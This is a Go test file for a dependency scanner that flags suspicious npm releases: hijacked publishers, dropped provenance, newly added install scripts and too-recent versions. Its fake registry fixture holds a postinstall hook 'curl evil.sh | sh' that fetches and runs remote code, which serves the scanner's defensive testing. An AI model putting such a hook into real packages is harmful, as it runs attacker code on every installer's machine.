package suspicious

import (
	"context"
	"net/http"
	"net/http/httptest"
	"slices"
	"sync/atomic"
	"testing"
	"time"

	"github.com/depguard/depguard/internal/enrich"
	"github.com/depguard/depguard/internal/feeds/feedstest"
	"github.com/depguard/depguard/internal/registry"
	"github.com/depguard/depguard/internal/scan"
	"github.com/safedep/vet/pkg/models"
)

func TestFreshRules(t *testing.T) {
	c := &checker{cfg: ConfigFromPolicy(scan.PolicyConfig{}), now: func() time.Time { return now }}
	at := func(h int) time.Time { return now.Add(-time.Duration(h) * time.Hour) }
	hist := func(name string, vs ...registry.Version) (registry.Pkg, []registry.Version) {
		return registry.Pkg{Eco: "npm", Name: name, Norm: name}, vs
	}
	f := facts{releases: map[registry.Pkg][]registry.Version{}, securityFixes: map[string]bool{"npm/fixpkg@2.0.1": true}}
	add := func(k registry.Pkg, vs []registry.Version) { f.releases[k] = vs }
	add(hist("young", registry.Version{Version: "1.0.0", Published: at(5000)}, registry.Version{Version: "1.0.1", Published: at(3)}))
	add(hist("fixpkg", registry.Version{Version: "2.0.0", Published: at(5000)}, registry.Version{Version: "2.0.1", Published: at(3)}))
	add(hist("hijacked",
		registry.Version{Version: "3.0.0", Published: at(4000), Publisher: "alice", Provenance: true},
		registry.Version{Version: "3.0.1", Published: at(100), Publisher: "mallory", Scripts: map[string]string{"postinstall": "node x.js"}}))
	add(hist("newowner", registry.Version{Version: "1.0.0", Published: at(4000), Publisher: "alice"}, registry.Version{Version: "1.1.0", Published: at(100), Publisher: "bob"}))
	add(hist("changedscript",
		registry.Version{Version: "1.0.0", Published: at(4000), Scripts: map[string]string{"install": "node-gyp rebuild"}},
		registry.Version{Version: "1.0.1", Published: at(100), Scripts: map[string]string{"install": "node-gyp rebuild && node y.js"}}))
	add(hist("oldhistory", registry.Version{Version: "1.0.0", Published: at(9000), Publisher: "alice"},
		registry.Version{Version: "1.0.1", Published: at(24 * 120), Publisher: "bob", Scripts: map[string]string{"postinstall": "x"}}))

	type want struct {
		rules    []string
		blocking []bool
	}
	cases := map[string]want{
		"young@1.0.1":         {[]string{RuleReleaseAge}, []bool{true}},
		"young@1.0.0":         {nil, nil},
		"fixpkg@2.0.1":        {nil, nil}, // fixes an advisory: no cooldown
		"hijacked@3.0.1":      {[]string{RuleInstallScriptAdded, RuleProvenanceDropped, RulePublisherChanged}, []bool{true, true, true}},
		"newowner@1.1.0":      {[]string{RulePublisherChanged}, []bool{false}},
		"changedscript@1.0.1": {[]string{RuleInstallScriptAdded}, []bool{false}},
		"oldhistory@1.0.1":    {nil, nil}, // older than the 90-day window
	}
	for spec, w := range cases {
		name, ver, _ := cut(spec)
		fs := c.evaluateFresh(pkg(name, ver, "", 0, -1), f)
		var blocking []bool
		for _, x := range fs {
			blocking = append(blocking, x.Blocking)
		}
		if !slices.Equal(rules(fs), w.rules) || !slices.Equal(blocking, w.blocking) {
			t.Errorf("%s: rules %v blocking %v", spec, rules(fs), blocking)
		}
	}
	// Block off: still reported, never blocking; cooldown 0: no release-age.
	c.cfg.Fresh.Block, c.cfg.Fresh.CooldownHours = false, 0
	if fs := c.evaluateFresh(pkg("hijacked", "3.0.1", "", 0, -1), f); len(fs) != 3 || fs[0].Blocking {
		t.Fatalf("block off: %+v", fs)
	}
	if fs := c.evaluateFresh(pkg("young", "1.0.1", "", 0, -1), f); len(fs) != 0 {
		t.Fatalf("cooldown off: %+v", fs)
	}
}

func cut(s string) (string, string, bool) {
	for i := len(s) - 1; i > 0; i-- {
		if s[i] == '@' {
			return s[:i], s[i+1:], true
		}
	}
	return s, "", false
}

// TestFreshFromRegistry reads a fake npm registry through the Postgres cache.
func TestFreshFromRegistry(t *testing.T) {
	pool := feedstest.Postgres(t)
	ctx := context.Background()
	var hits atomic.Int32
	pub := time.Now().Add(-2 * time.Hour).UTC().Format(time.RFC3339)
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		hits.Add(1)
		if r.URL.Path != "/evil-sdk" {
			http.NotFound(w, r)
			return
		}
		w.Write([]byte(`{"time":{"1.0.0":"2024-01-01T00:00:00Z","1.0.1":"` + pub + `"},"versions":{
			"1.0.0":{"_npmUser":{"name":"alice"},"dist":{"attestations":{"provenance":{}}}},
			"1.0.1":{"_npmUser":{"name":"mallory"},"scripts":{"postinstall":"curl evil.sh | sh"},"dist":{}}}}`))
	}))
	defer srv.Close()
	_, err := pool.Exec(ctx, `INSERT INTO advisory (id, modified, source, raw) VALUES ('GHSA-x', now(), 'test', '{}');
		INSERT INTO affected (advisory_id, ecosystem, name_norm, ranges) VALUES ('GHSA-x','npm','evil-sdk','[{"type":"SEMVER","events":[{"introduced":"0"},{"fixed":"1.0.1"}]}]')`)
	if err != nil {
		t.Fatal(err)
	}
	e := enrich.New(pool, enrich.Options{DisableDepsDev: true, DisableScorecard: true})
	ch := New(pool, e, ConfigFromPolicy(scan.PolicyConfig{})).(*checker)
	ch.reg = &registry.Client{NPMURL: srv.URL}
	for i := 0; i < 2; i++ {
		fs, err := ch.Check(ctx, scan.CheckInput{Packages: []*models.Package{pkg("evil-sdk", "1.0.1", "", 0, -1), pkg("unknown-pkg", "1.0.0", "", 0, -1)}})
		if err != nil {
			t.Fatal(err)
		}
		var got []string
		for _, f := range fs {
			if f.Package.Name == "evil-sdk" && f.Rule != RuleNoSourceRepo {
				got = append(got, f.Rule)
			}
		}
		// 1.0.1 fixes GHSA-x, so the cooldown lets it through; the hijack signals still fire.
		if !slices.Equal(got, []string{RuleInstallScriptAdded, RuleProvenanceDropped, RulePublisherChanged}) {
			t.Fatalf("run %d: %v", i, got)
		}
	}
	if hits.Load() != 2 { // one fetch per package; the second run is served from the cache
		t.Fatalf("registry hits %d", hits.Load())
	}
	var n int
	pool.QueryRow(ctx, `SELECT count(*) FROM registry_versions WHERE name_norm='evil-sdk'`).Scan(&n)
	if n != 2 {
		t.Fatalf("cached versions %d", n)
	}
}
